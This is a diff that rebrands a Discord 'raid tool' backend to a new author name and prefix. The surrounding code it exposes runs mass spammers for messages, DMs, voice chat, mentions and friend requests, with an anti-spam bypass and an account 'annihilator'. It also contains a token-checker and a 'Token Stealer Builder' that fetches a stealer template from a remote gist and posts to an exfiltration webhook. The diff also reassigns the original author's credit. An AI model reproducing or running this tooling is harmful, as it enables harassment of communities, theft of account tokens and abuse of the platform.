@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
-# Raid ToolBox Attack Controller "The Backend"
-# Author: DeadBread76 - https://github.com/DeadBread76/
+# raid tool Attack Controller "The Backend"
+# Author: meanwood - https://github.com/meanwood/
 # July 3rd, 2019
 #
-# Copyright (c) 2019, DeadBread
+# Copyright (c) 2019, meanwood
 #
 #                     GNU GENERAL PUBLIC LICENSE
 #                        Version 2, June 1991
@@ -356,7 +356,7 @@ command_line_mode = int(sys.argv[3])
 thread_count = sys.argv[4]
 theme = ast.literal_eval(sys.argv[5])
 try:
-    rtb_icon = base64.b64encode(open("./RTBFiles/rtb_icon.png", "rb").read())
+    rtb_icon = base64.b64encode(open("./MRTFiles/rtb_icon.png", "rb").read())
 except Exception as e:
     print(e)
     rtb_icon = b''
@@ -517,7 +517,7 @@ if mode == 'joiner':
             [sg.Text('Enter Invite to join.'), sg.InputText(size=(42,1), key="Invite"),sg.Button('Join',button_color=theme['button_colour'],size=(10,1))],
             [sg.Text('Delay'), sg.Combo(['0','1','3','5','10','60'], key="Delay"), sg.Checkbox('Log Info', tooltip='Log Info of server to text file.',size=(8,1), key="LogInfo"), sg.Checkbox('Widget joiner (Requires Server ID)', key="Widget"), sg.Text('Tokens:', size=(6,1)), sg.Combo([i for i in range(1,len(tokenlist)+1)], readonly=True, default_value=len(tokenlist), size=(2,1), tooltip="Number of tokens to join.", key="Limit")],
         ]
-        window = sg.Window('RTB | Joiner', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Joiner', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         link = values["Invite"]
@@ -569,14 +569,14 @@ if mode == 'joiner':
                 [sg.Text('Tokens Joined Successfully: {}'.format(len(successfully)))],
                 [sg.Button('kthxbye',button_color=theme['button_colour'],size=(15,1)), sg.Button('Export Tokens',button_color=theme['button_colour'],size=(15,1))]
             ]
-            window = sg.Window('RTB | Joiner Results', layout, keep_on_top=True, icon=rtb_icon)
+            window = sg.Window('MRT | Joiner Results', layout, keep_on_top=True, icon=rtb_icon)
             event, values = window.Read()
             window.Close()
             if event == "Export Tokens":
                 with open ("working_tokens_exported.txt","a+") as handle:
                     for token in successfully:
                         handle.write("{}\n".format(token))
-                sg.PopupOK('Exported {} tokens to working_tokens_exported.txt'.format(len(successfully)),title="RTB")
+                sg.PopupOK('Exported {} tokens to working_tokens_exported.txt'.format(len(successfully)),title="MRT")
         except Exception:
             pass
 
@@ -611,7 +611,7 @@ elif mode == 'leaver':
         layout = [
             [sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1), key="ID"),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Leaver', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Leaver', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         ID = values["ID"]
@@ -655,7 +655,7 @@ elif mode == 'groupleaver':
         layout = [
             [sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1), key="ID"),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Group DM Leaver', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Group DM Leaver', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         ID = values["ID"]
@@ -707,7 +707,7 @@ elif mode == "checker":
         [sg.Multiline(vlist, size=(70,20), key="Valid", disabled=True), sg.Multiline(vlist, size=(70,20), key="Invalid", disabled=True)],
         [sg.RButton('Save valid tokens',button_color=theme['button_colour'],size=(15,1)), sg.RButton('Stop Checking',button_color=theme['button_colour'],size=(15,1))]
     ]
-    window = sg.Window(f'RTB | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
+    window = sg.Window(f'MRT | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
     for token in tokenlist:
         executor.submit(check, token)
     while True:
@@ -715,7 +715,7 @@ elif mode == "checker":
         if event == sg.TIMEOUT_KEY:
             window["Valid"].Update(vlist)
             window["Invalid"].Update(ilist)
-            window.TKroot.title(f'RTB | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
+            window.TKroot.title(f'MRT | Checker [{len(validtokens)} Valid] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
         elif event is None:
             break
         elif event == "Save valid tokens":
@@ -725,7 +725,7 @@ elif mode == "checker":
             time.sleep(0.1)
             with open ("tokens/"+token_list,"w+") as handle:
                 handle.write(vlist)
-                sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
+                sg.PopupOK('Saved', title="MRT | Saved tokens", keep_on_top=True)
         elif event == "Stop Checking":
             executor.shutdown(wait=False)
     window.Close()
@@ -792,7 +792,7 @@ elif mode == "checkerV2":
     ]
     for token in tokenlist:
         executor.submit(checkv2, token)
-    window = sg.Window(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
+    window = sg.Window(f'MRT | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]', layout, keep_on_top=True, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=10)
         if event == sg.TIMEOUT_KEY:
@@ -802,7 +802,7 @@ elif mode == "checkerV2":
                 else:
                     print(token)
                     printed.append(token)
-            window.TKroot.title(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
+            window.TKroot.title(f'MRT | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
         elif event is None:
             break
         elif event == "Save Working":
@@ -818,7 +818,7 @@ elif mode == "checkerV2":
                     handle.write(f"{token}\n")
                 for token in unverifiedtokens:
                     handle.write(f"{token}\n")
-                sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
+                sg.PopupOK('Saved', title="MRT | Saved tokens", keep_on_top=True)
         elif event == "Stop Checking":
             executor.shutdown(wait=False)
     window.Close()
@@ -1023,7 +1023,7 @@ elif mode == 'messagespam':
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1)),sg.Checkbox("Append Emoji Spam",tooltip="Add Emoji Spam to message, message can be empty.", key="SpamEmoji"), sg.Checkbox("Anti-Spam Bypass",tooltip="Attempts to bypass anti-spam bots", key="Bypass")]
         ]
-        window = sg.Window('RTB | Message Spammer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Message Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1137,7 +1137,7 @@ elif mode == 'asciispam':
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Ascii Spammer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Ascii Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1274,7 +1274,7 @@ elif mode == 'massmention':
             [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all', key="Channel")],
             [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1292,7 +1292,7 @@ elif mode == 'massmention':
 elif mode == 'vcspam':
     import youtube_dl
     ydl_opts = {
-        'outtmpl': 'RTBFiles/vcspammercache/file.webm',
+        'outtmpl': 'MRTFiles/vcspammercache/file.webm',
         'format': 'bestaudio/best',
         'postprocessors': [{
             'key': 'FFmpegExtractAudio',
@@ -1307,7 +1307,7 @@ elif mode == 'vcspam':
             [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)), key="Count", default_value=len(tokenlist), size=(29,15), orientation='horizontal', font=('Helvetica', 10), text_color=(theme['slider_text_color']))],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Voice Chat Spammer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Voice Chat Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1321,14 +1321,14 @@ elif mode == 'vcspam':
         ytlink = sys.argv[6]
         channelid = sys.argv[7]
         ammount = sys.argv[8]
-    if not os.path.isdir('RTBFiles/vcspammercache/'):
-        os.mkdir("RTBFiles/vcspammercache/")
+    if not os.path.isdir('MRTFiles/vcspammercache/'):
+        os.mkdir("MRTFiles/vcspammercache/")
     with youtube_dl.YoutubeDL(ydl_opts) as ydl:
         info_dict = ydl.extract_info(ytlink, download=False)
         video_id = info_dict.get("id", None)
-    if not os.path.isfile(f'RTBFiles/vcspammercache/{video_id}.wav'):
+    if not os.path.isfile(f'MRTFiles/vcspammercache/{video_id}.wav'):
         ydl_opts = {
-            'outtmpl': f'RTBFiles/vcspammercache/{video_id}.webm',
+            'outtmpl': f'MRTFiles/vcspammercache/{video_id}.webm',
             'format': 'bestaudio/best',
             'postprocessors': [{
                 'key': 'FFmpegExtractAudio',
@@ -1341,7 +1341,7 @@ elif mode == 'vcspam':
     count = 0
     for token in tokenlist:
         count += 1
-        subprocess.Popen([python_command, 'RTBFiles/vcspam.py', token, channelid, f'RTBFiles/vcspammercache/{video_id}.wav', str(os.getpid())], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
+        subprocess.Popen([python_command, 'MRTFiles/vcspam.py', token, channelid, f'MRTFiles/vcspammercache/{video_id}.wav', str(os.getpid())], stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
         if count == int(ammount):
             break
     while True:
@@ -1391,7 +1391,7 @@ elif mode == 'dmspammer':
             [sg.Text('Text to spam', size=(15, 1)), sg.Input(key="SpamText"), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.', key="Ascii")],
             [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1448,7 +1448,7 @@ elif mode == 'friender':
             [sg.Input(key="User")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Friend Bomber', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Friend Bomber', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1500,7 +1500,7 @@ elif mode == 'groupdmspam':
             [sg.Text('Group ID', size=(15, 1)), sg.Input(key="GroupID")],
             [sg.Button('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Group DM Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1618,7 +1618,7 @@ elif mode == 'imagespam':
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="ServerID")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Random Image Spammer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Random Image Spammer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1657,7 +1657,7 @@ elif mode == 'gamechange':
             gamejson = {
                 "name": game,
                 "type": 1,
-                "url": "https://www.twitch.tv/DEADBREAD'S_RAID_TOOLBOX"
+                "url": "https://www.twitch.tv/meanwood's_RAID_TOOLBOX"
             }
         elif type == "Listening to":
             gamejson = {
@@ -1675,7 +1675,7 @@ elif mode == 'gamechange':
                 "token": token,
                 "properties": {
                     "$os": sys.platform,
-                    "$browser": "RTB",
+                    "$browser": "MRT",
                     "$device": f"{sys.platform} Device"
                 },
                 "presence": {
@@ -1705,7 +1705,7 @@ elif mode == 'gamechange':
             [sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 1), default_value='Playing', readonly=True, key="Type"), sg.InputText('osu!',size=(10, 1), key="Activity"),sg.Combo(['online', 'dnd', 'idle','random'], size=(10, 1), default_value='online', readonly=True, key="Status")],
             [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | Status Changer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Status Changer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1825,10 +1825,10 @@ elif mode == 'nickname':
     if command_line_mode == 0:
         layout = [
             [sg.Text('Server ID', size=(15, 1)), sg.Input(key="Server")],
-            [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True, key="Type"), sg.Input("DeadBread's Raid Toolbox", tooltip="New Nickname", key="Nick")],
+            [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True, key="Type"), sg.Input("meanwood's raid tool", tooltip="New Nickname", key="Nick")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Nickname Changer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Nickname Changer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -1863,7 +1863,7 @@ elif mode == 'embed':
                 },
                 "author": {
                     "name": author,
-                    "url": "https://github.com/DeadBread76/Raid-Toolbox",
+                    "url": "https://github.com/meanwood/mnwd_raid_tool",
                     "icon_url": iconurl
                 },
                 "fields": [
@@ -1953,7 +1953,7 @@ elif mode == 'embed':
         [sg.Text('Footer Text', size=(10, 1)), sg.Input(key="FooterText")],
         [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
     ]
-    window = sg.Window('RTB | Embed Spammer', layout, keep_on_top=True, icon=rtb_icon)
+    window = sg.Window('MRT | Embed Spammer', layout, keep_on_top=True, icon=rtb_icon)
     event, values = window.Read()
     window.Close()
     if event == "Start":
@@ -2045,7 +2045,7 @@ elif mode == 'avatarchange':
         [sg.Text('Random Avatars (Folder)',size=(20,1), key="RandomText"), sg.Input(key="AvatarRandom"), sg.FolderBrowse(button_color=theme['button_colour'], key="Folderbrowse")],
         [sg.Button('Start',button_color=theme['button_colour'],size=(10,1)), sg.Combo(['Single', 'Random'], key="Type", readonly=True)]
     ]
-    window = sg.Window('RTB | Avatar Changer', layout, keep_on_top=True, icon=rtb_icon)
+    window = sg.Window('MRT | Avatar Changer', layout, keep_on_top=True, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=100)
         if event == "Start":
@@ -2196,7 +2196,7 @@ elif mode == "rolemention":
             [sg.Text('Channel ID', size=(15, 1)), sg.Input('all', key="Channel")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Role Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Role Mass Mentioner', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2218,7 +2218,7 @@ elif mode == "cleanup":
             [sg.Input(key="Server")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Server Cleanup', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Server Cleanup', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2229,7 +2229,7 @@ elif mode == "cleanup":
     else:
         server = sys.argv[6]
     for token in tokenlist:
-        subprocess.Popen([python_command, 'RTBFiles/cleanup.py', token, server, str(os.getpid()), 'None'])
+        subprocess.Popen([python_command, 'MRTFiles/cleanup.py', token, server, str(os.getpid()), 'None'])
     while True:
         pass
 
@@ -2277,7 +2277,7 @@ elif mode == "hypesquad":
             [sg.Text('House To Change to', size=(15, 1)), sg.Combo(['Bravery', 'Brilliance', 'Balance', 'Random'], readonly=True, key="House")],
             [sg.Button('Start', button_color=theme['button_colour'],size=(10,1))]
         ]
-        window = sg.Window('RTB | HypeSquad House Changer', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | HypeSquad House Changer', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2418,7 +2418,7 @@ elif mode == "reaction":
             [sg.Combo(['Add','Remove'], readonly=True,size=(14,1), key="Method"), sg.Combo(emojilist, size=(10,1), key="Emoji", default_value=":smile:")],
             [sg.Button('Start', button_color=theme['button_colour'], size=(10,1))]
         ]
-        window = sg.Window('RTB | Message Reactor', layout, keep_on_top=True, icon=rtb_icon)
+        window = sg.Window('MRT | Message Reactor', layout, keep_on_top=True, icon=rtb_icon)
         event, values = window.Read()
         window.Close()
         if event == "Start":
@@ -2464,8 +2464,8 @@ elif mode == "StealerBuilder":
     if sys.platform.startswith("linux"):
         sg.Popup("Linux isn't supported yet.")
         sys.exit()
-    if not os.path.exists("RTBStealerBuilder/"):
-        os.mkdir("RTBStealerBuilder/")
+    if not os.path.exists("MRTStealerBuilder/"):
+        os.mkdir("MRTStealerBuilder/")
     def build():
         global name
         global webhook
@@ -2476,12 +2476,12 @@ elif mode == "StealerBuilder":
         global runonce
         global killdisc
         try:
-            os.chdir('RTBStealerBuilder/')
+            os.chdir('MRTStealerBuilder/')
             pyname = name+'.py'
             if sys.platform.startswith("win32"):
-                temp = request.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplate.py").text
+                temp = request.get("https://gist.githubusercontent.com/meanwood/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplate.py").text
             elif sys.platform.startswith("darwin"):
-                temp = request.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplatemac.py").text
+                temp = request.get("https://gist.githubusercontent.com/meanwood/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplatemac.py").text
             with open("template.py", "w+") as handle:
                 handle.write(temp)
             with open("template.py") as f:
@@ -2524,7 +2524,7 @@ elif mode == "StealerBuilder":
         [sg.Output(size=(80, 15))],
         [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
     ]
-    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.3.0", layout, icon=rtb_icon)
+    window = sg.Window("MRT | meanwood's Token Stealer Builder v 0.3.0", layout, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=10)
         if event is None or event == 'Exit':
@@ -2541,9 +2541,9 @@ elif mode == "StealerBuilder":
             window.Refresh()
         elif event == "Test":
             payload = {
-            "username": "Raid ToolBox",
+            "username": "raid tool",
             "avatar_url": 'https://i.imgur.com/TioPl63.png',
-            "content": "Test, Sent From Raid ToolBox"
+            "content": "Test, Sent From raid tool"
             }
             try:
                 src = request.post(values["Webhook"], json=payload).text
@@ -2852,7 +2852,7 @@ elif mode == "DDDC":
         number = random.randint(1,51)
         if 'sayori' in message.content.lower() and message.author == client.user:
             if random.randint(1,3) == 1:
-                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/ŞêýåŅĶäûų.png"))
+                file = await message.channel.send(file=discord.File("MRTFiles/DDDC/ŞêýåŅĶäûų.png"))
                 await asyncio.sleep(0.7)
                 await file.delete()
             gtext = []
@@ -2912,7 +2912,7 @@ elif mode == "DDDC":
 
         if 'happy' in message.content.lower() and message.author == client.user:
             if random.randint(1,3) == 1:
-                file = await message.channel.send(file=discord.File("RTBFiles/DDDC/HAPPY.jpg"))
+                file = await message.channel.send(file=discord.File("MRTFiles/DDDC/HAPPY.jpg"))
                 await asyncio.sleep(random.randint(1,11))
                 await file.delete()
 
@@ -2934,7 +2934,7 @@ elif mode == "DDDC":
                 pass
 
         if number == 21 and message.author == client.user:
-            files = ["RTBFiles/DDDC/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii.txt","RTBFiles/DDDC/hxppy thxughts.png","RTBFiles/DDDC/CAN YOU HEAR ME.txt","RTBFiles/DDDC/monika.chr","RTBFiles/DDDC/traceback.txt"]
+            files = ["MRTFiles/DDDC/iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii.txt","MRTFiles/DDDC/hxppy thxughts.png","MRTFiles/DDDC/CAN YOU HEAR ME.txt","MRTFiles/DDDC/monika.chr","MRTFiles/DDDC/traceback.txt"]
             gtext = []
             text = ('¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿĀāĂăĄąĆćĈĉĊċČčĎďĐđĒēĔĕĖėĘęĚěĜĝĞğĠġĢģĤĥĦħĨĩĪīĬĭĮįİıĲĳĴĵĶķĸĹĺĻļĽľĿŀŁłŃńŅņŇňŉŊŋŌōŎŏŐőŒœŔŕŖŗŘřŚśŜŝŞşŠšŢţŤťŦŧŨũŪūŬŭŮůŰűŲųŴŵŶŷŸŹźŻżŽž')
             for char in text:
@@ -2974,7 +2974,7 @@ elif mode == "Gifts":
         layout.append([sg.Text(g, size=(50,1)), sg.Button("Take",key=g)])
     if len(list(g)) == 0:
         layout.append([sg.Text("None")])
-    window = sg.Window("DeadBread's Raid ToolBox | Gift Inventory", icon=rtb_icon).Layout(layout)
+    window = sg.Window("meanwood's raid tool | Gift Inventory", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read()
         if event is None:
@@ -3020,7 +3020,7 @@ elif mode == "AppList":
             input_rows.append([sg.Input(bot['username'], disabled=False, size=(15,1)), sg.Input(bot['discriminator'], disabled=False, size=(15,1)), sg.Input(bot['id'], disabled=False, size=(15,1)), sg.Input(bot['token'], disabled=False, size=(25,1))])
     layout = header + input_rows
     layout.append([sg.Button("Save all tokens")])
-    window = sg.Window("RTB | Token Bots", icon=rtb_icon).Layout(layout)
+    window = sg.Window("MRT | Token Bots", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read()
         if event is None:
@@ -3043,7 +3043,7 @@ elif mode == "CustomConnection":
         [sg.Combo(['Leauge of Legends', 'Battle.net', 'Skype'], size=(16,1), key="TYPE", readonly=True), sg.Input("Name", size=(20,1), key="NAME"), sg.Input("ID", size=(15,1), key="ID")],
         [sg.Button("Create Connection")]
     ]
-    window = sg.Window("RTB | Custom Connections", icon=rtb_icon).Layout(layout)
+    window = sg.Window("MRT | Custom Connections", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read()
         if event is None:
@@ -3449,7 +3449,7 @@ elif mode == "Annihilator": # China be like
         [sg.Button("Annihilate", size=(15,1))],
         [sg.Output(size=(75,10), visible=False, key="Output")]
     ]
-    window = sg.Window("RTB | Account Annihilator", icon=rtb_icon).Layout(layout)
+    window = sg.Window("MRT | Account Annihilator", icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read(timeout=50)
         if event is None:
@@ -3501,7 +3501,7 @@ elif mode == "ProxyScraper":
         if not os.path.isdir("proxies"):
             os.mkdir("proxies")
         proxies = []
-        links = request.get("https://gist.githubusercontent.com/DeadBread76/608c733168cb808783d2024def3ea736/raw/db2d029485647a1033b07551453de47d8f9ed75e/Proxy%2520Sources%2520(Stolen%2520from%2520Proxyscrape%2520Scraper%2520lol).txt").text.split("\n")
+        links = request.get("https://gist.githubusercontent.com/meanwood/608c733168cb808783d2024def3ea736/raw/db2d029485647a1033b07551453de47d8f9ed75e/Proxy%2520Sources%2520(Stolen%2520from%2520Proxyscrape%2520Scraper%2520lol).txt").text.split("\n")
         linkno = 0
         scraping = True
         name = datetime.now().strftime("%m-%d-%Y %H-%M-%S")
@@ -3561,7 +3561,7 @@ elif mode == "ProxyScraper":
         [sg.Output(size=(105, 20))],
         [sg.Button("Scrape Proxies", size=(15,1), key="ScrapeButton"), sg.Input(key="ProxyListPath"), sg.FileBrowse(file_types=(("Text Files", "*.txt"),("All Files", "*.*")), key="Brow"), sg.Button("Check", key="Checkbutton"), sg.Combo(['https', 'http', 'socks4', 'socks5'], key="Type", readonly=True), sg.Text("Timeout (In Seconds):"), sg.Spin([x + 1 for x in range(500)], 10, key='TimeOut')]
     ]
-    window = sg.Window("RTB | Proxy Scraper/Checker", resizable=False, auto_size_buttons=True, icon=rtb_icon).Layout(layout)
+    window = sg.Window("MRT | Proxy Scraper/Checker", resizable=False, auto_size_buttons=True, icon=rtb_icon).Layout(layout)
     while True:
         event, values = window.Read(timeout=50)
         if event is None:
@@ -3571,21 +3571,21 @@ elif mode == "ProxyScraper":
                 print(p)
                 printqueue.remove(p)
             if scraping:
-                window.TKroot.title(f'RTB | Proxy Scraper/Checker [Scraping {finished}/{len(links)}, {len(proxies)} proxies total.]')
+                window.TKroot.title(f'MRT | Proxy Scraper/Checker [Scraping {finished}/{len(links)}, {len(proxies)} proxies total.]')
                 window['ScrapeButton'].Update(disabled=True)
                 window['Checkbutton'].Update(disabled=True)
                 window['ProxyListPath'].Update(disabled=True)
                 window['Brow'].Update(disabled=True)
                 window['Type'].Update(disabled=True)
             elif checking:
-                window.TKroot.title(f'RTB | Proxy Scraper/Checker [Working: {working} | Dead: {dead} | Total: {len(proxylist)}]')
+                window.TKroot.title(f'MRT | Proxy Scraper/Checker [Working: {working} | Dead: {dead} | Total: {len(proxylist)}]')
                 window['ScrapeButton'].Update(disabled=True)
                 window['Checkbutton'].Update(disabled=True)
                 window['ProxyListPath'].Update(disabled=True)
                 window['Brow'].Update(disabled=True)
                 window['Type'].Update(disabled=True)
             else:
-                window.TKroot.title(f'RTB | Proxy Scraper/Checker')
+                window.TKroot.title(f'MRT | Proxy Scraper/Checker')
                 window['ScrapeButton'].Update(disabled=False)
                 window['Checkbutton'].Update(disabled=False)
                 window['ProxyListPath'].Update(disabled=False)
@@ -3643,7 +3643,7 @@ elif mode == "TokenNames":
     ]
     for token in tokenlist:
         executor.submit(check_name, token)
-    window = sg.Window(f'RTB | Token Names', layout, keep_on_top=True, icon=rtb_icon)
+    window = sg.Window(f'MRT | Token Names', layout, keep_on_top=True, icon=rtb_icon)
     while True:
         event, values = window.Read(timeout=10)
         if event is None:
@@ -3675,7 +3675,7 @@ elif mode == "CPUWIDGET":
         window.Element('text').Update(f'CPU {cpu_percent:02.0f}%')
 
 elif mode == 'ree':
-    picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
+    picdata = requests.get("https://gist.githubusercontent.com/meanwood/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
     pic = picdata.content
     while True:
         try:
